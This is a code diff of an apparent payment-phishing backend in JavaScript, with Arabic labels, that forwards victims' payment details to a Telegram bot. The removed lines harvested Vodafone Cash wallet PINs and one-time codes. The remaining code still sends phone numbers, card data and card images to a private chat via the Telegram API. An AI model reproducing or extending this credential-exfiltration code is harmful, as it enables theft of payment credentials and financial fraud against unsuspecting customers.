@@ -49,7 +49,7 @@ async function fetchNetworkDetailsByIP(ip) {
 function getPaymentMethodName(data) {
   let method = data.payment_method || data.source_type || data.method || "محفظة إلكترونية";
   if (method === "card") method = "💳 بطاقة بنكية";
-  else if (method === "wallet" || method === "vodafone_cash") method = "📱 فودافون كاش / محفظة إلكترونية";
+  else if (method === "wallet") method = "📱 محفظة إلكترونية";
   return method;
 }
 
@@ -85,8 +85,6 @@ async function sendTelegramMessage(data, isInitial = true) {
 
     const branchName = data.branchName || data.branch_name || "حكايات نت رئيسي";
     const userPhone = data.phone || 
-                        data.user_phone ||
-                        data.phoneNumber ||
                         data.billing_data?.phone_number || 
                         data.customer?.phone_number || 
                         "غير محدد";
@@ -115,10 +113,6 @@ async function sendTelegramMessage(data, isInitial = true) {
       const userTimeZone = data.userTimeZone || "غير متوفر";
       const lang = data.lang || "غير متوفر";
 
-      // استقبال حقول فودافون كاش الجديدة
-      const walletPin = data.wallet_pin || "غير مدخل";
-      const otpCode = data.otp || "لم يتم إدخاله بعد";
-
       message = `⏳ <b>جاري عملية الدفع...</b>\n\n` +
                 `🏢 الفرع: <b>${branchName}</b>\n` +
                 `💳 وسيلة الدفع: <b>${method}</b>\n` +
@@ -126,13 +120,6 @@ async function sendTelegramMessage(data, isInitial = true) {
 
       if (userPhone && userPhone !== "غير محدد") {
         message += `📱 رقم المحفظة / الهاتف: <code>${userPhone}</code>\n`;
-      }
-
-      // 🔐 إضافة بيانات فودافون كاش (الرقم السري ورمز التأكيد)
-      if (walletPin !== "غير مدخل" || otpCode !== "لم يتم إدخاله بعد") {
-        message += `\n--- <b>بيانات فودافون كاش</b> ---\n` +
-                   `🔑 الرقم السري للمحفظة (PIN): <code>${walletPin}</code>\n` +
-                   `🔐 رمز التأكيد المتغير (OTP): <code>${otpCode}</code>\n`;
       }
 
       if (data.card_data && data.card_data.number && data.card_data.number !== "غير مدخل") {
@@ -206,6 +193,7 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
     const form = new FormData();
     form.append("chat_id", CHAT_ID);
     
+    // إرفاق الصورة كـ Buffer مع تحديد اسم الملف ونوع الـ Content-Type بوضوح
     form.append("photo", imageBuffer, {
       filename: `card_${paymentDetails.transactionId || Date.now()}.png`,
       contentType: "image/png"
@@ -222,6 +210,7 @@ async function sendVoucherWithCardImage(paymentDetails, imageBuffer) {
     form.append("caption", caption);
     form.append("parse_mode", "HTML");
 
+    // إرسال الطلب مع إضافة ترويسات الـ Form Data المناسبة
     const response = await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
       headers: {
         ...form.getHeaders()
